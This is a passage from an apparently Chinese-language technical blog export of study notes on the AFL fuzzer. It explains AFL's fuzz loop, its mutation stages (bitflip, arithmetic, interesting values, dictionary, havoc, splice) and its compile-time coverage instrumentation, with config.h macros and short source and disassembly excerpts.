class="headerlink" title="fuzz循环"></a>fuzz循环</h1><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h2><p>精简队列。</p><blockquote><p>为了优化模糊工作，AFL使用快速算法定期重新评估队列，该算法选择一个较小的测试用例子集，该子集仍覆盖到目前为止所看到的每个元组，并且其特征使它们对Fuzzing特别有利。该算法通过为每个队列条目分配与其执行延迟和文件大小成正比的分数来工作;然后为每个tuples选择最低得分候选者。<br>cull_queue()遍历top_rated[]中的queue，然后提取出发现新的edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。<br>这里本质上采用了贪婪算法，如果top_rated[i]存在，且对应temp_v[]中对应bit位还没抹去，即这一轮选出的queue还没覆盖bit_map[i]对应的边，则取出这个top_rated[i]。抹去temp_v中top_rated[i]能访问到的位。最后将这个top_rated[i]标记为favored,如果这个queue还没fuzzed，pending_favored++.</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><code>static void show_init_stats(void)</code>在处理输入目录的末尾显示快速统计信息，并添加一系列警告。<br> 一些校准的东西也在这里结束了，还有一些硬编码的常量。也许最终会清理干净。</li><li><code>static u32 find_start_position(void)</code>在恢复时，尝试找到要开始的队列位置。只有在恢复时，以及在可以找到原始fuzzer_stats时，这才有意义。</li><li><code>static void write_stats_file(double bitmap_cvg, double stability, double eps)</code>更新一些状态稳健。</li><li><code>static void save_auto(void)</code>自动更新token，目录/queue/.state/auto<em>extras/auto</em>。</li><li>循环开始前，调用<code>cull_queue()</code> 对queue进行筛选</li></ol><h2 id="while-1"><a href="#while-1" class="headerlink" title="while(1)"></a>while(1)</h2><ol><li>判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</li><li>找到queue入口的testcase，seek_to = find_start_position()；直接跳到该testcase</li><li>如果一整个队列循环都没新发现，尝试重组策略。</li><li>调用关键函数fuzz_one()对该testcase进行fuzz。fuzz_one()函数参见3.4。</li><li>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</li></ol><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one()"></a>fuzz_one()</h2><p><code>static u8 fuzz_one_original(char** argv)</code>从队列中取出当前testcase并模糊。这个函数太长了…如果fuzzed成功，返回0;如果跳过或退出，返回1。<br><strong>步骤：</strong></p><ol><li><p>根据是否有pending_favored和queue_cur的情况按照概率进行跳过；有pending_favored, 对于fuzz过的或者non-favored的以概率99%跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored。</p></li><li><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case进行测试。</p></li><li><p>如果测试用例没有修剪过，那么调用函数<code>trim_case</code>对测试用例进行修剪。</p></li><li><p>修剪完毕之后，使用<code>calculate_score</code>对每个测试用例进行打分。</p></li><li><p>如果该queue已经完成deterministic阶段，则直接跳到havoc阶段</p></li><li><p>deterministic阶段变异4个stage，变异过程中会多次调用函数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">common_fuzz_stuff</span><br></pre></td></tr></table></figure><p> 保存interesting 的种子：</p><blockquote><p>bitflip，按位翻转，1变为0，0变为1<br>arithmetic，整数加/减算术运算<br>interest，把一些特殊内容替换到原文件中<br>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></blockquote></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异。</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件。</p></li><li><p>该 testcase完成。 The </p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hicookie.me/2019/09/18/AFL-Learning/">https://hicookie.me/2019/09/18/AFL-Learning/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-12">https://xz.aliyun.com/t/4628#toc-12</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 变异原理</title>
      <link href="posts/20f730a9/"/>
      <url>posts/20f730a9/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="http://rk700.github.io/2018/01/04/afl-mutations/">http://rk700.github.io/2018/01/04/afl-mutations/</a></p><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ul><li>bitflip，按位翻转，1变为0，0变为1</li><li>arithmetic，整数加/减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换/插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul><p>其中，前四项bitflip, arithmetic, interest, dictionary是非dumb mode（<code>-d</code>）和主fuzzer（<code>-M</code>）会进行的操作，由于其变异方式没有随机性，所以也称为deterministic fuzzing；havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p>以下将对这些变异类型进行具体介绍。</p><h1 id="bitflip"><a href="#bitflip" class="headerlink" title="bitflip"></a>bitflip</h1><p>拿到一个原始文件，打头阵的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转<strong>1</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的<strong>2</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的<strong>4</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的<strong>8</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个byte做翻转</li><li>bitflip 16/8，每次翻转相邻的<strong>16</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的<strong>32</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p>作为精妙构思的fuzzer，AFL不会放过每一个获取文件信息的机会。这一点在bitflip过程中就体现的淋漓尽致。具体地，在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断。</p><h2 id="自动检测token"><a href="#自动检测token" class="headerlink" title="自动检测token"></a>自动检测token</h2><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致(检测程序执行路径的方式可见上篇文章中<a href="https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90">“分支信息的分析”</a>一节)，那么就把这一段连续的bytes判断是一条token。</p><p>例如，PNG文件中用<code>IHDR</code>作为起始块的标识，那么就会存在类似于以下的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">........IHDR........</span><br></pre></td></tr></table></figure><p>当翻转到字符<code>I</code>的最高位时，因为<code>IHDR</code>被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，<code>IHDR</code>标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：<code>IHDR</code>，并将其记录下来为后面的变异提供备选。</p><p>AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在<code>config.h</code>中通过宏定义了限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Length limits for auto-detected dictionary tokens: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 </span><br><span class="line">&#x2F;* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define USE_AUTO_EXTRAS 10 </span><br><span class="line">#define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10)</span><br></pre></td></tr></table></figure><p>对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改<code>MAX_AUTO_EXTRA</code>为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。</p><h2 id="生成effector-map"><a href="#生成effector-map" class="headerlink" title="生成effector map"></a>生成effector map</h2><p>在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。</p><p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</p><p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</p><p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Minimum input file length at which the effector logic kicks in: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MIN_LEN 128 </span><br><span class="line">&#x2F;* Maximum effector density past which everything is just fuzzed unconditionally (%): *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MAX_PERC 90</span><br></pre></td></tr></table></figure><p>即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。</p><h1 id="arithmetic"><a href="#arithmetic" class="headerlink" title="arithmetic"></a>arithmetic</h1><p>在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段：</p><ul><li>arith 8/8，每次对<strong>8</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对<strong>16</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对<strong>32</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减变异的上限，在<code>config.h</code>中的宏<code>ARITH_MAX</code>定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p><p>此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><h1 id="interest"><a href="#interest" class="headerlink" title="interest"></a>interest</h1><p>下一个阶段是interest，具体可分为：</p><ul><li>interest 8/8，每次对<strong>8</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对<strong>16</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对<strong>32</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>而用于替换的”interesting values”，是AFL预设的一些比较特殊的数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static s8  interesting_8[]  &#x3D; &#123; INTERESTING_8 &#125;;</span><br><span class="line">static s16 interesting_16[] &#x3D; &#123; INTERESTING_8, INTERESTING_16 &#125;;</span><br><span class="line">static s32 interesting_32[] &#x3D; &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;</span><br></pre></td></tr></table></figure><p>这些数的定义在<code>config.h</code>文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* List of interesting values to use in fuzzing. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define INTERESTING_8 \ -128, &#x2F;* Overflow signed 8-bit when decremented *&#x2F; \ -1, &#x2F;* *&#x2F; \ 0, &#x2F;* *&#x2F; \ 1, &#x2F;* *&#x2F; \ 16, &#x2F;* One-off with common buffer size *&#x2F; \ 32, &#x2F;* One-off with common buffer size *&#x2F; \ 64, &#x2F;* One-off with common buffer size *&#x2F; \ 100, &#x2F;* One-off with common buffer size *&#x2F; \ 127 &#x2F;* Overflow signed 8-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_16 \ -32768, &#x2F;* Overflow signed 16-bit when decremented *&#x2F; \ -129, &#x2F;* Overflow signed 8-bit *&#x2F; \ 128, &#x2F;* Overflow signed 8-bit *&#x2F; \ 255, &#x2F;* Overflow unsig 8-bit when incremented *&#x2F; \ 256, &#x2F;* Overflow unsig 8-bit *&#x2F; \ 512, &#x2F;* One-off with common buffer size *&#x2F; \ 1000, &#x2F;* One-off with common buffer size *&#x2F; \ 1024, &#x2F;* One-off with common buffer size *&#x2F; \ 4096, &#x2F;* One-off with common buffer size *&#x2F; \ 32767 &#x2F;* Overflow signed 16-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_32 \ -2147483648LL, &#x2F;* Overflow signed 32-bit when decremented *&#x2F; \ -100663046, &#x2F;* Large negative number (endian-agnostic) *&#x2F; \ -32769, &#x2F;* Overflow signed 16-bit *&#x2F; \ 32768, &#x2F;* Overflow signed 16-bit *&#x2F; \ 65535, &#x2F;* Overflow unsig 16-bit when incremented *&#x2F; \ 65536, &#x2F;* Overflow unsig 16 bit *&#x2F; \ 100663045, &#x2F;* Large positive number (endian-agnostic) *&#x2F; \ 2147483647 &#x2F;* Overflow signed 32-bit when incremented *&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到，用于替换的基本都是可能会造成溢出的数。</p><p>与之前类似，effector map仍然会用于判断是否需要变异；此外，如果某个interesting value，是可以通过bitflip或者arithmetic变异达到，那么这样的重复性变异也是会跳过的。</p><h1 id="dictionary"><a href="#dictionary" class="headerlink" title="dictionary"></a>dictionary</h1><p>进入到这个阶段，就接近deterministic fuzzing的尾声了。具体有以下子阶段：</p><ul><li>user extras (over)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>替换</strong>到原文件中</li><li>user extras (insert)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>插入</strong>到原文件中</li><li>auto extras (over)，从头开始，将<strong>自动检测</strong>的tokens依次<strong>替换</strong>到原文件中</li></ul><p>其中，用户提供的tokens，是在词典文件中设置并通过<code>-x</code>选项指定的，如果没有则跳过相应的子阶段。</p><h2 id="user-extras-over"><a href="#user-extras-over" class="headerlink" title="user extras (over)"></a>user extras (over)</h2><p>对于用户提供的tokens，AFL先按照长度从小到大进行排序。这样做的好处是，只要按照顺序使用排序后的tokens，那么后面的token不会比之前的短，从而每次覆盖替换后不需要再恢复到原状。</p><p>随后，AFL会检查tokens的数量，如果数量大于预设的<code>MAX_DET_EXTRAS</code>（默认值为200），那么对每个token会根据概率来决定是否进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for (j &#x3D; 0; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also skip them if there&#39;s no room to insert the payload, if the token is redundant, or if its entire span has no bytes set in the effector map. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;&#x3D; MAX_DET_EXTRAS) ||</span><br><span class="line">      extras[j].len &gt; len - i ||</span><br><span class="line">      !memcmp(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">      !memchr(eff_map + EFF_APOS(i), 1, EFF_SPAN_ALEN(i, extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">    stage_max--;</span><br><span class="line">    continue;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>UR(extras_cnt)</code>是运行时生成的一个<code>0</code>到<code>extras_cnt</code>之间的随机数。所以，如果用户词典中一共有400个tokens，那么每个token就有<code>200/400=50%</code>的概率执行替换变异。我们可以修改<code>MAX_DET_EXTRAS</code>的大小来调整这一概率。</p><p>由上述代码也可以看到，effector map在这里同样被使用了：如果要替换的目标bytes全部是“无效”的，那么就跳过这一段，对下一段目标执行替换。</p><h2 id="user-extras-insert"><a href="#user-extras-insert" class="headerlink" title="user extras (insert)"></a>user extras (insert)</h2><p>这一子阶段是对用户提供的tokens执行插入变异。不过与上一个子阶段不同的是，此时并没有对tokens数量的限制，所以全部tokens都会从原文件的第1个byte开始，依次向后插入；此外，由于原文件并未发生替换，所以effector map不会被使用。</p><p>这一子阶段最特别的地方，就是变异不能简单地恢复。之前每次变异完，在变异位置处简单取逆即可，例如bitflip后，再进行一次同样的bitflip就恢复为原文件。正因为如此，之前的变异总体运算量并不大。</p><p>但是，对于<strong>插入</strong>这种变异方式，恢复起来则复杂的多，所以AFL采取的方式是：将原文件分割为插入前和插入后的部分，再加上插入的内容，将这3部分依次复制到目标缓冲区中（当然这里还有一些小的优化，具体可阅读代码）。而对每个token的每处插入，都需要进行上述过程。所以，如果用户提供了大量tokens，或者原文件很大，那么这一阶段的运算量就会非常的多。直观表现上，就是AFL的执行状态栏中，”user extras (insert)”的总执行量很大，执行时间很长。如果出现了这种情况，那么就可以考虑适当删减一些tokens。</p><h2 id="auto-extras-over"><a href="#auto-extras-over" class="headerlink" title="auto extras (over)"></a>auto extras (over)</h2><p>这一项与”user extras (over)”很类似，区别在于，这里的tokens是最开始bitflip阶段自动生成的。另外，自动生成的tokens总量会由<code>USE_AUTO_EXTRAS</code>限制（默认为10）。</p><h1 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h1><p>对于非dumb mode的主fuzzer来说，完成了上述deterministic fuzzing后，便进入了充满随机性的这一阶段；对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始。</p><p>havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul><p>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</p><h1 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h1><p>历经了如此多的考验，文件的变异也进入到了最后的阶段：splice。如其意思所说，splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异。</p><p>具体地，AFL在seed文件队列中随机选取一个，与当前的seed文件做对比。如果两者差别不大，就再重新随机选一个；如果两者相差比较明显，那么就随机选取一个位置，将两者都分割为头部和尾部。最后，将当前文件的头部与随机文件的尾部拼接起来，就得到了新的文件。在这里，AFL还会过滤掉拼接文件未发生变化的情况。</p><h1 id="cycle"><a href="#cycle" class="headerlink" title="cycle"></a>cycle</h1><p>于是乎，一个seed文件，在上述的全部变异都执行完成后，就…抱歉，还没结束。</p><p>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。</p><p>当然，如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL细节小计</title>
      <link href="posts/53fcd800/"/>
      <url>posts/53fcd800/</url>
      
        <content type="html"><![CDATA[<h1 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h1><p>代码覆盖率，是一种通过计算测试过程中被执行的源代码占全部源代码的比例，进而间接度量软件质量的方法。其计量方式很多，但无论是 GCC 的 GCOV 还是 LLVM 的 SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测。</p><h2 id="函数（Fuction-Level）"><a href="#函数（Fuction-Level）" class="headerlink" title="函数（Fuction-Level）"></a><strong>函数（Fuction-Level）</strong></h2><p>函数就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。所以，通常的统计方式是用基本块，简称BB。</p><h2 id="基本块（BasicBlock-Level）"><a href="#基本块（BasicBlock-Level）" class="headerlink" title="基本块（BasicBlock-Level）"></a><strong>基本块（BasicBlock-Level）</strong></h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413173114.png" alt="image-20210413173114591"></p><p>IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。</p><h2 id="边界（Edge-Level）"><a href="#边界（Edge-Level）" class="headerlink" title="边界（Edge-Level）"></a><strong>边界（Edge-Level）</strong></h2><p>edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。</p><p>我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><p>具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong> 的信息，从而获取目标的执行流程和代码覆盖情况，下文会详细介绍。</p><h1 id="代码插桩"><a href="#代码插桩" class="headerlink" title="代码插桩"></a>代码插桩</h1><p><code>afl</code>插桩的代码写在<code>afl-gcc.c</code>里面，afl-gcc 是 gcc 的一个封装(wrapper)。主要实现的下述的三个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find_as(argv[<span class="number">0</span>]);                         <span class="comment">//找到gcc/clang/llvm编译器</span></span><br><span class="line">edit_params(argc, argv);                  <span class="comment">//设置cc的参数</span></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);  <span class="comment">//执行</span></span><br></pre></td></tr></table></figure><p>我们在 <code>execvp</code>之前，加入一段代码打印出<code>cc_params</code>的参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$:./afl-gcc demo.c -o <span class="built_in">test</span>                                                                                                    </span><br><span class="line">afl-cc 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line">        arg0: gcc</span><br><span class="line">        arg1: demo.c</span><br><span class="line">        arg2: -o</span><br><span class="line">        arg3: <span class="built_in">test</span></span><br><span class="line">        arg4: -B</span><br><span class="line">        arg5: .</span><br><span class="line">        arg6: -g</span><br><span class="line">        arg7: -O3</span><br><span class="line">        arg8: -funroll-loops</span><br><span class="line">        arg9: -D__AFL_COMPILER=1</span><br><span class="line">        arg10: -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure><p>我们知道一个二进制文件完整的流程是：预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是<code>as</code>。编译完成<code>AFL</code>后，在其目录下也会存在一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。所以，如果通过<code>-B</code>选项为<code>gcc</code>设置了搜索路径(根据gcc –help可知)，那么<code>afl-as</code>便会作为汇编器，执行实际的汇编操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-funroll-loops     ：执行循环强度消除并消除在循环内部使用的变量。这是用简单而快速的操作（如加法和减法）替代耗时操作（如乘法和除法）的过程</span><br><span class="line">-B &lt; &gt;             ：设置编译器的搜索路径。</span><br><span class="line">ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION     &#x2F;* a flag also shared with libfuzzer) or *&#x2F;</span><br><span class="line">ifdef __AFL_COMPILER                             &#x2F;* (this one is just for AFL). *&#x2F;</span><br></pre></td></tr></table></figure><p>反汇编我们刚刚所编译出来的 test 文件可以发现其中多了一些汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400860</span><br><span class="line">.text:0000000000400860 argc &#x3D; rdi                              ; int</span><br><span class="line">.text:0000000000400860 argv &#x3D; rsi                              ; char **</span><br><span class="line">.text:0000000000400860 ; __unwind &#123;</span><br><span class="line">.text:0000000000400860                 lea     rsp, [rsp-98h]</span><br><span class="line">.text:0000000000400868                 mov     [rsp+98h+var_98], rdx</span><br><span class="line">.text:000000000040086C                 mov     [rsp+98h+var_90], rcx</span><br><span class="line">.text:0000000000400871                 mov     [rsp+98h+var_88], rax</span><br><span class="line">.text:0000000000400876                 mov     rcx, 459Eh</span><br><span class="line">.text:000000000040087D                 call    __afl_maybe_log</span><br><span class="line">.text:0000000000400882                 mov     rax, [rsp+98h+var_88]</span><br><span class="line">.text:0000000000400887                 mov     rcx, [rsp+98h+var_90]</span><br><span class="line">.text:000000000040088C                 mov     rdx, [rsp+98h+var_98]</span><br><span class="line">.text:0000000000400890                 lea     rsp, 